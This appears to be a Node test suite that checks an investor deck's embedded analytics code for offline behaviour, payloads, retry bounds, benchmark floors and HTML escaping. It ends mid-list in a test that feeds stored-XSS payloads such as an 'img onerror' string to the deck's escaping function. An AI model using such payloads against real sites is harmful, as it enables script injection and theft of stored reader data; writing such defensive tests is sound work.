#!/usr/bin/env node
/* ===================================================================
   npm run test:client — the deck's transport, without a browser
   ===================================================================

   scripts/test.mjs covers the server. This covers the other half: the
   ~200 lines inside the deck that decide whether to talk to the server at
   all, what to send, and what to do when a send fails. That code carries
   the properties the whole design rests on — offline-first, absolute
   payloads, no infinite loops — and none of them were being checked.

   HOW IT RUNS REAL CODE

   The deck is one 3.5 MB file and cannot be imported. So this lifts the
   "the record" and "the benchmark" sections straight out of it, between
   their own marker comments, and evaluates them with every browser global
   they touch replaced by a stub we control: location, fetch, sendBeacon,
   localStorage, the timer, and the deck's own SESSION/slides/dwellSum.

   Lifting by marker rather than by line number means renumbering the deck
   cannot silently turn this suite into a no-op. If a marker moves, the
   extraction fails loudly instead.

   What this does NOT cover: anything requiring layout or real events. That
   still needs a browser.
   =================================================================== */

import { readFile } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const DECK = path.join(root, 'nateland-investor-deck-EXTERNAL.html');

const START_MARKER = '/* ---- the record ---';
const END_MARKER   = '/* ---- dwell accounting ---';

const html = await readFile(DECK, 'utf8');
const start = html.indexOf(START_MARKER);
const end   = html.indexOf(END_MARKER);

if (start < 0 || end < 0 || end <= start) {
  console.error(`Could not find the record section in the deck.
  "${START_MARKER}" at ${start}
  "${END_MARKER}" at ${end}
If those comments were renamed, update this file — do not delete the check.`);
  process.exit(1);
}

const SOURCE = html.slice(start, end);

/* ---- the runner --------------------------------------------------- */
let passed = 0;
const failures = [];

async function test(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`  [32m✓[0m ${name}`);
  } catch (err) {
    failures.push({ name, err });
    console.log(`  [31m✗[0m ${name}`);
    console.log(`      ${String(err.message).split('\n')[0]}`);
  }
}

function assert(cond, msg) { if (!cond) throw new Error(msg ?? 'assertion failed'); }
function equal(a, b, msg) {
  if (a !== b) throw new Error(`${msg ?? 'not equal'}: expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`);
}

/* ---- the harness --------------------------------------------------
   Builds one isolated copy of the record code with stubbed surroundings.
   Everything the tests need to observe or control is returned.
   ------------------------------------------------------------------ */
function harness(options = {}) {
  const {
    protocol = 'https:',
    hostname = 'deck.example.com',
    dwell = {},
    order = [],
    slideCount = 28,
    email = 'ada@example.com',
    signedIn = true,
    hasBeacon = true,
    hasRandomUUID = true,
    responder = null            /* (url, body) -> { status, json } */
  } = options;

  const calls = [];             /* every fetch */
  const beacons = [];           /* every sendBeacon */
  const timers = [];            /* pending setTimeout callbacks */
  const saves = [];             /* sessionSave invocations */

  /* A clock we own, so the mute cooldown can be tested by moving time rather
     than by reaching into REC and pretending. */
  let clock = 1_700_000_000_000;

  const SESSION = {
    name: 'Ada Lovelace', firstName: 'Ada', email, phone: '', org: 'Analytical Engines',
    signedInAt: signedIn ? 1 : null,
    dwell: { ...dwell },
    order: [...order],
    visits: 1,
    recId: null,
    _current: null, _since: null, paused: false
  };

  const slides = Array.from({ length: slideCount }, (_, i) => ({ i }));

  function respond(url, body) {
    const r = responder
      ? responder(url, body ? JSON.parse(body) : null)
      : { status: 200, json: { ok: true, viewerId: '7' } };

    if (r === 'network-error') return Promise.reject(new Error('offline'));

    return Promise.resolve({
      ok: r.status >= 200 && r.status < 300,
      status: r.status,
      json: () => r.json === undefined
        ? Promise.reject(new Error('not json'))
        : Promise.resolve(r.json)
    });
  }

  const ctx = {
    /* --- browser surface --- */
    location: { protocol, hostname, origin: `${protocol}//${hostname}` },
    navigator: hasBeacon
      ? { sendBeacon: (url, blob) => { beacons.push({ url, blob }); return true; } }
      : {},
    window: {
      screen: { width: 1920, height: 1080 },
      crypto: hasRandomUUID
        ? { randomUUID: () => 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee' }
        : {}
    },
    screen: { width: 1920, height: 1080 },
    document: { referrer: 'https://mail.example.com/' },
    Blob: class { constructor(parts, opts) { this.parts = parts; this.type = opts && opts.type; } },

    fetch: (url, init) => {
      calls.push({ url, init, body: init && init.body, method: (init && init.method) || 'GET' });
      return respond(url, init && init.body);
    },

    setTimeout: (fn, ms) => { timers.push({ fn, ms }); return timers.length; },
    clearTimeout: (id) => { if (id) timers[id - 1] = null; },
    Date: { now: () => clock },

    /* --- the deck's own surroundings --- */
    SESSION,
    slides,
    slideTitle: (i) => `Slide ${i + 1}`,
    dwellSum: () => Object.values(SESSION.dwell).reduce((a, b) => a + b, 0),
    sessionSave: () => { saves.push(1); },
    cur: 0,
    BENCH_SAMPLE: {
      viewers: 34, medianTotalMs: 680000, medianSlidesSeen: 24,
      top: [{ slide: 22, title: 'Economic projections', ms: 96000 }]
    }
  };

  /* `with` is the point here: it makes every free identifier in the lifted
     source resolve against ctx first, so the code under test is byte-for-byte
     what ships without needing a single seam added for testability. */
  const build = new Function('ctx', `
    with (ctx) {
      ${SOURCE}
      return {
        REC: REC, API_ORIGIN: API_ORIGIN, BEAT_MS: BEAT_MS, REC_GIVE_UP: REC_GIVE_UP,
        REC_MAX_REIDENTIFY: REC_MAX_REIDENTIFY, REC_MAX_SIGNIN: REC_MAX_SIGNIN,
        REC_MUTE_MS: REC_MUTE_MS, MIN_REAL_READERS: MIN_REAL_READERS,
        uuid: uuid, recResolveBase: recResolveBase, recLive: recLive,
        recPost: recPost, recSignIn: recSignIn, recPayload: recPayload,
        recBeat: recBeat, recFlush: recFlush, recEvent: recEvent,
        recStats: recStats, benchData: benchData, benchIsReal: benchIsReal
      };
    }
  `);

  const api = build(ctx);
  return {
    ...api, ctx, SESSION, calls, beacons, timers, saves,
    advance(ms) { clock += ms; return clock; },
    fireTimers() {
      const pending = timers.filter(Boolean);
      timers.length = 0;
      pending.forEach(t => t.fn());
      return pending.length;
    }
  };
}

/* A harness already past sign-in, which is where most behaviour lives. */
function signedInHarness(options = {}) {
  const h = harness(options);
  h.SESSION.recId = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee';
  h.REC.identified = true;
  return h;
}

console.log('\nextraction\n');

await test('lifts the record section out of the deck', () => {
  assert(SOURCE.length > 3000, `section looks too small: ${SOURCE.length} bytes`);
  ['function recPost', 'function recSignIn', 'function recFlush', 'function recPayload',
   'function recEvent', 'function recStats', 'function benchData'].forEach(fn => {
    assert(SOURCE.includes(fn), `missing ${fn}`);
  });
});

await test('the lifted code evaluates', () => {
  const h = harness();
  assert(typeof h.recFlush === 'function', 'recFlush came through');
  assert(h.API_ORIGIN.startsWith('https://'), 'API_ORIGIN is a URL');
});

console.log('\nwhere it decides to send (recResolveBase)\n');

const BASE_CASES = [
  ['file:',  'anything',                          null, 'the emailed copy makes no requests'],
  ['blob:',  'anything',                          null, 'a blob URL likewise'],
  ['data:',  '',                                  null, 'a data URL likewise'],
  ['http:',  'localhost',                         '',   'local dev is same-origin'],
  ['http:',  '127.0.0.1',                         '',   'so is the loopback address'],
  ['https:', 'bluewater-tau.vercel.app',          '',   'production is same-origin'],
  ['https:', 'bluewater-git-abc-team.vercel.app', '',   'so is a preview deployment'],
  ['https:', 'www.storylandstudios.com',          'ORIGIN', 'the proxy posts to Vercel'],
  ['https:', 'notvercel.app',                     'ORIGIN', 'a lookalike host is not us'],
  ['https:', 'evil-vercel.app',                   'ORIGIN', 'nor is a hyphenated one'],
  ['https:', 'vercel.app.evil.com',               'ORIGIN', 'nor a suffix in the middle']
];

for (const [protocol, hostname, want, why] of BASE_CASES) {
  await test(`${protocol}//${hostname} — ${why}`, () => {
    const h = harness({ protocol, hostname });
    const got = h.recResolveBase();
    equal(got, want === 'ORIGIN' ? h.API_ORIGIN : want, `${protocol}//${hostname}`);
  });
}

await test('file:// really makes no network call, even when asked to flush', async () => {
  const h = harness({ protocol: 'file:', hostname: '' });
  h.SESSION.recId = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee';
  h.REC.identified = true;
  h.recFlush(false);
  h.recFlush(true);
  await h.recSignIn(false);
  h.recEvent('wrap_opened');
  await h.recStats();
  h.fireTimers();
  equal(h.calls.length, 0, 'no fetch');
  equal(h.beacons.length, 0, 'no beacon');
});

console.log('\nwhat it sends (recPayload)\n');

await test('reports absolute totals, not deltas', () => {
  const h = signedInHarness({ dwell: { 0: 4000, 21: 90000 }, order: [0, 21] });
  const p = h.recPayload();
  equal(p.totalMs, 94000, 'total is the sum of what is banked');
  equal(p.slidesSeen, 2);
  equal(p.slidesTotal, 28);
  equal(p.slides.length, 2);
});

await test('carries each slide title and its place in the reading order', () => {
  const h = signedInHarness({ dwell: { 5: 1000, 2: 2000 }, order: [5, 2] });
  const rows = h.recPayload().slides;
  const five = rows.find(r => r.i === 5);
  const two  = rows.find(r => r.i === 2);
  equal(five.title, 'Slide 6', 'title from the deck');
  equal(five.order, 0, 'seen first');
  equal(two.order, 1, 'seen second');
});

await test('finished only once the last slide has been opened', () => {
  const notYet = signedInHarness({ dwell: { 0: 10 }, order: [0], slideCount: 28 });
  equal(notYet.recPayload().finished, false);

  const done = signedInHarness({ dwell: { 27: 10 }, order: [27], slideCount: 28 });
  equal(done.recPayload().finished, true, 'index 27 of 28 is the last slide');
});

await test('a dwell key missing from the order does not corrupt the payload', () => {
  /* order is written on first entry and dwell on commit, so a crash between
     the two could leave a key in one and not the other. */
  const h = signedInHarness({ dwell: { 3: 5000 }, order: [] });
  const row = h.recPayload().slides[0];
  equal(row.i, 3);
  equal(row.order, -1, 'indexOf miss surfaces as -1 for the server to null out');
});

await test('building a payload never triggers a save, which would re-arm a send', () => {
  const h = signedInHarness({ dwell: { 0: 1000 }, order: [0] });
  const before = h.saves.length;
  h.recPayload();
  h.recPayload();
  equal(h.saves.length, before, 'no sessionSave, so no recBeat, so no loop');
});

console.log('\nwhen it sends (recBeat / recFlush)\n');

await test('a beat is debounced rather than sent per change', () => {
  const h = signedInHarness({ dwell: { 0: 1 }, order: [0] });
  h.recBeat(); h.recBeat(); h.recBeat();
  equal(h.timers.filter(Boolean).length, 1, 'one pending timer for three changes');
  equal(h.calls.length, 0, 'nothing sent yet');
  h.fireTimers();
  equal(h.calls.length, 1, 'one request once it fires');
});

await test('an unchanged state is not re-sent', () => {
  const h = signedInHarness({ dwell: { 0: 1000 }, order: [0] });
  h.recFlush(false);
  equal(h.calls.length, 1);
  h.recFlush(false);
  equal(h.calls.length, 1, 'suppressed — nothing moved');
});

await test('a change after a send does go', () => {
  const h = signedInHarness({ dwell: { 0: 1000 }, order: [0] });
  h.recFlush(false);
  h.SESSION.dwell[1] = 2000;
  h.SESSION.order.push(1);
  h.recFlush(false);
  equal(h.calls.length, 2);
});

await test('a queued event forces a send even when nothing else moved', () => {
  const h = signedInHarness({ dwell: { 0: 1000 }, order: [0] });
  h.recFlush(false);
  equal(h.calls.length, 1);
  h.REC.queue.push({ id: 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee', kind: 'wrap_opened' });
  h.recFlush(false);
  equal(h.calls.length, 2, 'the event is why');
});

await test('a beacon always goes, so the closing tab banks its last slide', () => {
  const h = signedInHarness({ dwell: { 0: 1000 }, order: [0] });
  h.recFlush(false);
  h.recFlush(true);
  equal(h.beacons.length, 1, 'sent as a beacon');
  equal(h.beacons[0].blob.type, 'application/json', 'typed so the server parses it');
});

await test('a pending debounce is cancelled by an immediate flush', () => {
  const h = signedInHarness({ dwell: { 0: 1000 }, order: [0] });
  h.recBeat();
  assert(h.timers.filter(Boolean).length === 1, 'armed');
  h.recFlush(false);
  equal(h.timers.filter(Boolean).length, 0, 'disarmed — no duplicate send');
});

await test('nothing is sent before sign-in has been acknowledged', () => {
  const h = harness();
  h.SESSION.recId = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee';
  h.REC.identified = false;
  h.recFlush(false);
  h.recBeat();
  h.fireTimers();
  equal(h.calls.length, 0, 'a beat before signin would only earn a 409');
});

console.log('\nevents\n');

await test('an acknowledged event leaves the queue', async () => {
  const h = signedInHarness({ dwell: { 0: 1 }, order: [0] });
  h.recEvent('wrap_opened');
  equal(h.REC.queue.length, 1);
  h.recFlush(false);
  await new Promise(r => setImmediate(r));
  equal(h.REC.queue.length, 0, 'dropped once stored');
});

await test('an unacknowledged event is kept for the next try', async () => {
  const h = signedInHarness({
    dwell: { 0: 1 }, order: [0],
    responder: () => 'network-error'
  });
  h.recEvent('wrap_opened');
  h.recFlush(false);
  await new Promise(r => setImmediate(r));
  equal(h.REC.queue.length, 1, 'still queued, not silently lost');
});

await test('the queue is capped so a deck left open cannot grow it forever', () => {
  const h = signedInHarness({ dwell: { 0: 1 }, order: [0] });
  for (let i = 0; i < 200; i++) h.recEvent('tick');
  assert(h.REC.queue.length <= 40, `capped, got ${h.REC.queue.length}`);
});

await test('an event records the slide it happened on', () => {
  const h = signedInHarness({ dwell: { 0: 1 }, order: [0] });
  h.ctx.cur = 21;
  h.recEvent('breakout');
  equal(h.REC.queue[0].slide, 21);
});

await test('events carry distinct ids, so the server can dedupe a retry', () => {
  const h = signedInHarness({ dwell: { 0: 1 }, order: [0], hasRandomUUID: false });
  for (let i = 0; i < 25; i++) h.recEvent('tick');
  const ids = new Set(h.REC.queue.map(e => e.id));
  equal(ids.size, h.REC.queue.length, 'no collisions from the fallback uuid');
  h.REC.queue.forEach(e => {
    assert(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/.test(e.id),
      `fallback uuid is well formed: ${e.id}`);
  });
});

console.log('\nwhen the server says no\n');

await test('a 409 re-identifies once or twice, then stops for good', async () => {
  /* THIS TEST MUST NEVER HANG.
     recSignIn calls recFlush on success and this is reached from recFlush, so
     a server holding /api/beat at 409 closes a cycle between them. It runs
     entirely in promise callbacks, so an unbounded version never yields to the
     event loop and no amount of awaiting escapes it — an earlier draft of this
     suite froze here, which is precisely what a reader's browser would do.

     So the stub itself breaks the cycle at BREAK_AT. A bounded implementation
     stops long before that and this passes; an unbounded one hits the ceiling
     and fails with a number, rather than hanging a CI run forever. */
  const BREAK_AT = 40;
  let signins = 0, beats = 0;

  const h = signedInHarness({
    dwell: { 0: 1000 }, order: [0],
    /* Match on the exact path. A successful sign-in also warms /api/stats, so
       an endsWith-else-it-is-a-beat stub silently counts those too. */
    responder: (url) => {
      if (url.endsWith('/api/signin')) {
        signins++;
        return { status: 200, json: { ok: true, viewerId: '7' } };
      }
      if (url.indexOf('/api/stats') !== -1) {
        return { status: 200, json: { ok: true, viewers: 0, top: [] } };
      }
      beats++;
      if (beats >= BREAK_AT) return { status: 200, json: { ok: true } };
      return { status: 409, json: { ok: false, error: 'unknown readId — sign in first' } };
    }
  });

  h.recFlush(false);
  for (let i = 0; i < 200; i++) await new Promise(r => setImmediate(r));

  assert(beats >= 1, 'it did try');
  assert(signins >= 1, 'and did re-identify');
  assert(beats < BREAK_AT,
    `bounded: expected it to give up well before ${BREAK_AT} beats, got ${beats}`);
  equal(beats, h.REC_MAX_REIDENTIFY + 1,
    'one beat, then one per allowed recovery');
  equal(signins, h.REC_MAX_REIDENTIFY, 'one sign-in per allowed recovery');
  equal(h.recLive(), false, 'and it has gone quiet rather than spinning');
});

await test('a single 409 that resolves does not burn the budget', async () => {
  /* The realistic case: the row is missing once, signing in recreates it, the
     retry lands. That must not leave the counter armed for the rest of the
     session, or two unrelated hiccups an hour apart would silence the record. */
  let beats = 0;
  const h = signedInHarness({
    dwell: { 0: 1000 }, order: [0],
    responder: (url) => {
      if (url.endsWith('/api/signin')) return { status: 200, json: { ok: true, viewerId: '7' } };
      if (url.indexOf('/api/stats') !== -1) return { status: 200, json: { ok: true, viewers: 0, top: [] } };
      beats++;
      return beats === 1
        ? { status: 409, json: { ok: false, error: 'unknown readId' } }
        : { status: 200, json: { ok: true } };
    }
  });

  h.recFlush(false);
  for (let i = 0; i < 40; i++) await new Promise(r => setImmediate(r));

  equal(beats, 2, 'the 409, then a successful retry');
  equal(h.REC.reidentifies, 0, 'counter reset by the success');
  equal(h.recLive(), true, 'still recording');
});

await test('a refusal does not count towards giving up, because the server answered', async () => {
  const h = signedInHarness({
    dwell: { 0: 1000 }, order: [0],
    responder: () => ({ status: 400, json: { ok: false, error: 'bad' } })
  });
  h.recFlush(false);
  await new Promise(r => setImmediate(r));
  equal(h.REC.failures, 0, 'reachable server, so no strike');
});

await test('it stops trying after repeated dead connections', async () => {
  const h = signedInHarness({
    dwell: { 0: 1000 }, order: [0],
    responder: () => 'network-error'
  });

  for (let i = 0; i < h.REC_GIVE_UP + 3; i++) {
    h.REC.last = '';                       /* a genuine change each round */
    h.recFlush(false);
    await new Promise(r => setImmediate(r));
  }
  assert(h.REC.failures >= h.REC_GIVE_UP, `strikes counted: ${h.REC.failures}`);
  equal(h.recLive(), false, 'given up');

  const before = h.calls.length;
  h.REC.last = '';
  h.recFlush(false);
  equal(h.calls.length, before, 'and it stays quiet');
});

await test('going quiet is a cooldown, not a life sentence', async () => {
  /* This used to latch off for the life of the page: four dead connections and
     the deck stopped recording until a reload. A reader on a train goes through
     tunnels; losing the remaining fifty-nine minutes of an hour-long read
     because of the first one is a lot of data to throw away. */
  let dead = true;
  const h = signedInHarness({
    dwell: { 0: 1000 }, order: [0],
    responder: () => dead ? 'network-error' : { status: 200, json: { ok: true } }
  });

  for (let i = 0; i < h.REC_GIVE_UP; i++) {
    h.REC.last = '';
    h.recFlush(false);
    await new Promise(r => setImmediate(r));
  }
  equal(h.recLive(), false, 'quiet after the strikes');

  h.advance(30_000);
  equal(h.recLive(), false, 'still quiet halfway through the cooldown');

  dead = false;
  h.advance(31_000);
  equal(h.recLive(), true, 'and trying again once it has passed');
  equal(h.REC.failures, 0, 'with a clean slate');

  const before = h.calls.length;
  h.REC.last = '';
  h.recFlush(false);
  await new Promise(r => setImmediate(r));
  equal(h.calls.length, before + 1, 'the next beat really goes');
});

await test('a still-dead network mutes again rather than hammering', async () => {
  const h = signedInHarness({
    dwell: { 0: 1000 }, order: [0],
    responder: () => 'network-error'
  });
  for (let i = 0; i < h.REC_GIVE_UP; i++) {
    h.REC.last = '';
    h.recFlush(false);
    await new Promise(r => setImmediate(r));
  }
  h.advance(61_000);
  equal(h.recLive(), true, 'one attempt allowed through');

  h.REC.last = '';
  h.recFlush(false);
  await new Promise(r => setImmediate(r));
  equal(h.REC.failures, 1, 'which failed');

  /* The point: it did not replay all four strikes at once. */
  const after = h.calls.length;
  h.advance(1000);
  h.REC.last = '';
  h.recFlush(false);
  await new Promise(r => setImmediate(r));
  assert(h.calls.length - after <= 1, 'at most one more attempt, not a burst');
});

await test('a success clears the strikes', async () => {
  let fail = true;
  const h = signedInHarness({
    dwell: { 0: 1000 }, order: [0],
    responder: () => fail ? 'network-error' : { status: 200, json: { ok: true } }
  });
  h.recFlush(false);
  await new Promise(r => setImmediate(r));
  equal(h.REC.failures, 1);

  fail = false;
  h.REC.last = '';
  h.recFlush(false);
  await new Promise(r => setImmediate(r));
  equal(h.REC.failures, 0, 'reset, so a brief outage is not permanent');
});

console.log('\nsign-in\n');

await test('mints and saves a record id on first sign-in', async () => {
  const h = harness();
  equal(h.SESSION.recId, null);
  await h.recSignIn(false);
  assert(h.SESSION.recId, 'an id was minted');
  assert(h.saves.length > 0, 'and persisted, or a reload would start a second row');
});

await test('sends the identity and the context the server stores', async () => {
  const h = harness();
  await h.recSignIn(false);
  const body = JSON.parse(h.calls[0].body);
  equal(body.email, 'ada@example.com');
  equal(body.name, 'Ada Lovelace');
  equal(body.org, 'Analytical Engines');
  equal(body.slidesTotal, 28);
  equal(body.screen, '1920x1080');
  equal(body.returning, false);
  equal(body.referrer, 'https://mail.example.com/');
});

await test('marks a later visit as returning', async () => {
  const h = harness();
  await h.recSignIn(true);
  equal(JSON.parse(h.calls[0].body).returning, true);
});

await test('does nothing without an email, so there is nobody to record', async () => {
  const h = harness({ email: '' });
  const out = await h.recSignIn(false);
  equal(out, false);
  equal(h.calls.length, 0);
});

await test('a successful sign-in flushes what accumulated while it was in flight', async () => {
  const h = harness({ dwell: { 0: 5000 }, order: [0] });
  await h.recSignIn(false);
  const beats = h.calls.filter(c => c.url.endsWith('/api/beat'));
  equal(beats.length, 1, 'the waiting dwell went straight out');
});

await test('a failed sign-in leaves it unidentified rather than half-open', async () => {
  const h = harness({ responder: () => ({ status: 500, json: { ok: false } }) });
  const out = await h.recSignIn(false);
  equal(out, false);
  equal(h.REC.identified, false);
});

await test('a sign-in that did not land is retried, and then recorded', async () => {
  /* Everything else is guarded on REC.identified, which only a successful
     sign-in sets — so without a retry one dropped reply silenced the entire
     page: every later beat no-op'd, the pagehide beacon no-op'd, and the 409
     recovery could not help because it lives inside the code that had stopped
     running. The whole read went unrecorded. */
  let attempts = 0;
  const h = harness({
    dwell: { 0: 8000 }, order: [0],
    responder: (url) => {
      if (url.endsWith('/api/signin')) {
        attempts++;
        return attempts < 3
          ? 'network-error'
          : { status: 200, json: { ok: true, viewerId: '7' } };
      }
      return { status: 200, json: { ok: true } };
    }
  });

  await h.recSignIn(false);
  equal(h.REC.identified, false, 'first attempt failed');
  assert(h.timers.filter(Boolean).length >= 1, 'a retry is scheduled');

  h.fireTimers();
  await new Promise(r => setImmediate(r));
  h.fireTimers();
  for (let i = 0; i < 20; i++) await new Promise(r => setImmediate(r));

  equal(attempts, 3, 'it kept trying');
  equal(h.REC.identified, true, 'and got there');
  equal(h.REC.signinTries, 0, 'counter reset by the success');
});

await test('sign-in retries are bounded', async () => {
  let attempts = 0;
  const h = harness({
    dwell: { 0: 1000 }, order: [0],
    responder: (url) => {
      if (url.endsWith('/api/signin')) { attempts++; return 'network-error'; }
      return { status: 200, json: { ok: true } };
    }
  });

  await h.recSignIn(false);
  for (let i = 0; i < 12; i++) {
    h.fireTimers();
    await new Promise(r => setImmediate(r));
  }
  assert(attempts <= h.REC_MAX_SIGNIN + 1,
    `bounded: at most ${h.REC_MAX_SIGNIN + 1} attempts, got ${attempts}`);
  equal(h.REC.identified, false);
});

await test('a 400 is not retried, because it will refuse the same way again', async () => {
  let attempts = 0;
  const h = harness({
    responder: (url) => {
      if (url.endsWith('/api/signin')) {
        attempts++;
        return { status: 400, json: { ok: false, error: 'a valid email is required' } };
      }
      return { status: 200, json: { ok: true } };
    }
  });

  await h.recSignIn(false);
  h.fireTimers();
  await new Promise(r => setImmediate(r));
  equal(attempts, 1, 'asked once and took the answer');
});

await test('two sign-ins do not overlap', async () => {
  let inFlight = 0, maxInFlight = 0;
  const h = harness({
    responder: (url) => {
      if (url.endsWith('/api/signin')) {
        inFlight++;
        maxInFlight = Math.max(maxInFlight, inFlight);
        inFlight--;
        return { status: 200, json: { ok: true, viewerId: '7' } };
      }
      return { status: 200, json: { ok: true } };
    }
  });
  await Promise.all([h.recSignIn(false), h.recSignIn(false), h.recSignIn(true)]);
  equal(maxInFlight, 1, 'one at a time');
});

console.log('\nthe benchmark\n');

await test('falls back to the sample figures with no server', async () => {
  const h = harness({ protocol: 'file:', hostname: '' });
  await h.recStats();
  equal(h.benchIsReal(), false);
  equal(h.benchData().viewers, 34, 'the sample');
});

await test('ignores real figures below the honesty floor', async () => {
  const h = signedInHarness({
    responder: () => ({ status: 200, json: {
      ok: true, viewers: 2, medianTotalMs: 1000, medianSlidesSeen: 3,
      top: [{ slide: 4, title: 'x', ms: 500 }]
    } })
  });
  await h.recStats();
  equal(h.benchIsReal(), false, 'two readers is not a benchmark');
  equal(h.benchData().viewers, 34, 'sample retained');
});

await test('adopts real figures at the floor', async () => {
  const h = signedInHarness({
    responder: () => ({ status: 200, json: {
      ok: true, viewers: 3, medianTotalMs: 42000, medianSlidesSeen: 9,
      top: [{ slide: 4, title: 'Site strategy', ms: 500 }]
    } })
  });
  await h.recStats();
  equal(h.MIN_REAL_READERS, 3, 'the floor is where the deck says it is');
  equal(h.benchIsReal(), true);
  equal(h.benchData().viewers, 3);
  equal(h.benchData().medianTotalMs, 42000);
});

await test('keeps the sample when the response has real readers but no slides', async () => {
  const h = signedInHarness({
    responder: () => ({ status: 200, json: {
      ok: true, viewers: 9, medianTotalMs: 1000, medianSlidesSeen: 3, top: []
    } })
  });
  await h.recStats();
  equal(h.benchIsReal(), false, 'an empty column is worse than a labelled sample');
});

await test('survives a stats response that is not JSON', async () => {
  const h = signedInHarness({ responder: () => ({ status: 200 }) });
  const out = await h.recStats();
  equal(out, null);
  equal(h.benchIsReal(), false);
});

await test('survives a dead connection while fetching stats', async () => {
  const h = signedInHarness({ responder: () => 'network-error' });
  const out = await h.recStats();
  equal(out, null);
});

console.log('\ndegradation\n');

await test('works with no sendBeacon, falling back to keepalive fetch', () => {
  const h = signedInHarness({ dwell: { 0: 1000 }, order: [0], hasBeacon: false });
  h.recFlush(true);
  equal(h.beacons.length, 0);
  equal(h.calls.length, 1, 'went by fetch instead');
  equal(h.calls[0].init.keepalive, true, 'flagged to outlive the page');
});

await test('works with no crypto.randomUUID', () => {
  const h = harness({ hasRandomUUID: false });
  const id = h.uuid();
  assert(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/.test(id),
    `well-formed v4: ${id}`);
});

await test('every request is JSON and cross-origin capable', async () => {
  const h = harness({ hostname: 'www.storylandstudios.com' });
  await h.recSignIn(false);
  const init = h.calls[0].init;
  equal(init.method, 'POST');
  equal(init.mode, 'cors', 'the proxy case needs it');
  equal(init.headers['Content-Type'], 'application/json');
  assert(h.calls[0].url.startsWith(h.API_ORIGIN), 'aimed at Vercel, not at WordPress');
});

console.log('\nslides read, not merely opened\n');

/* slidesRead() sits with the read-back rather than in the record section, and
   it is self-contained apart from SESSION.dwell — so lift it the same way. */
const READ_SRC = (() => {
  const from = html.indexOf('var READ_MS = 10000;');
  const to = html.indexOf('/* Each card:');
  return from >= 0 && to > from ? html.slice(from, to) : '';
})();

function readHarness(dwell) {
  if (!READ_SRC) return null;
  const ctx = { SESSION: { dwell } };
  return new Function('ctx', `with (ctx) { ${READ_SRC}; return { READ_MS: READ_MS, slidesRead: slidesRead }; }`)(ctx);
}

await test('slidesRead() was found in the deck', () => {
  assert(READ_SRC, 'could not lift READ_MS/slidesRead — did they move?');
  equal(readHarness({}).READ_MS, 10000, 'the threshold is ten seconds');
});

await test('counts only slides held for MORE than ten seconds', () => {
  /* The boundary is the whole point of the figure, so pin both sides of it.
     Exactly 10000ms does not count: the card claims slides *read*, and the
     rule is "more than ten seconds", not "at least". */
  const h = readHarness({
    0: 45000,     // well over
    21: 30000,    // over
    20: 12000,    // over
    16: 10001,    // one millisecond over — counts
    15: 10000,    // exactly on the line — does not
    14: 9999,     // just under
    13: 500,      // glanced
    12: 1         // arrow-keyed past
  });
  equal(h.slidesRead(), 4);
});

await test('is zero when every slide was only glanced at', () => {
  equal(readHarness({ 0: 900, 1: 2000, 2: 40 }).slidesRead(), 0);
});

await test('is zero with no dwell at all', () => {
  equal(readHarness({}).slidesRead(), 0);
});

await test('counts every slide when all were read properly', () => {
  equal(readHarness({ 0: 20000, 1: 30000, 2: 11000 }).slidesRead(), 3);
});

await test('the summary tile prints the read count, not the opened count', () => {
  /* Source-level tripwire, same reasoning as the escaping one: the unit tests
     above would keep passing if the tile went back to c.seen. */
  const from = html.indexOf('Slides read');
  assert(from > 0, 'the tile is labelled "Slides read"');
  const block = html.slice(from, from + 160);
  assert(/c\.read/.test(block), 'and it reads c.read');
  assert(!/c\.seen/.test(block), 'not c.seen');
  assert(html.indexOf('Slides opened') === -1, 'the old label is gone');
});

await test('the first card quotes the read count, not the opened count', () => {
  /* Both cards must agree. The summary tile saying "Slides read 4 of 28"
     seconds after the first card said "across 20 of 28 slides" invited the
     reader to wonder which one was broken. */
  const from = html.indexOf("line: 'You spent");
  assert(from > 0, 'found the first card’s line');
  const block = html.slice(from, from + 320);

  assert(block.includes('and read '), 'it says "and read"');
  assert(/\bread\b/.test(block), 'and uses the read count');
  assert(!/\bseen\b/.test(block), 'the opened count is gone from this card');
  assert(!block.includes(', across ' + "'"), 'and the doubled "across" with it');
});

await test('the first card claims nothing when no slide was read', () => {
  /* Arrowing straight to the end leaves every slide under ten seconds. The
     hero above this line says "you read the deck", so printing "read 0 of 28"
     underneath it reads as a bug rather than as candour. */
  const from = html.indexOf("line: 'You spent");
  const block = html.slice(from, from + 320);
  assert(/read > 0 \?/.test(block), 'the clause is conditional on a non-zero count');
});

await test('the header puts the name before the label', () => {
  const from = html.indexOf('class="wr-sum-head"');
  assert(from > 0, 'found the header');
  const block = html.slice(from, from + 260);
  const name = block.indexOf('wr-sum-name');
  const kicker = block.indexOf('wr-sum-kicker');
  assert(name > 0 && kicker > 0, 'both are present');
  assert(name < kicker,
    'name first in document order — the row is justified to the edges, so that is what puts it on the left');
});

console.log('\nescaping the one thing that is not ours\n');

/* esc() and num() live beside wrapSummaryHTML rather than in the record
   section, and wrapSummaryHTML itself needs half the deck to run. So lift just
   these two — they are self-contained — and check the sink separately, at the
   source level. */
const ESC_SRC = (() => {
  const from = html.indexOf('function esc(s){');
  const to = html.indexOf('function wrapSummaryHTML(c){');
  return from >= 0 && to > from ? html.slice(from, to) : '';
})();

const escApi = ESC_SRC
  ? new Function(`${ESC_SRC}; return { esc: esc, num: num };`)()
  : null;

await test('esc() and num() were found in the deck', () => {
  assert(escApi, 'could not lift esc()/num() — did they move or get renamed?');
});

await test('esc() neutralises the payload an attacker could store', () => {
  /* /api/beat is unauthenticated by necessity, so a slide title is
     attacker-controlled text that /api/stats then republishes to every reader.
     Unescaped into innerHTML that is stored XSS, running in the origin whose
     localStorage holds the reader's name, email, phone and firm. */
  const payloads = [
    '<img src=x onerror=alert(1)>',
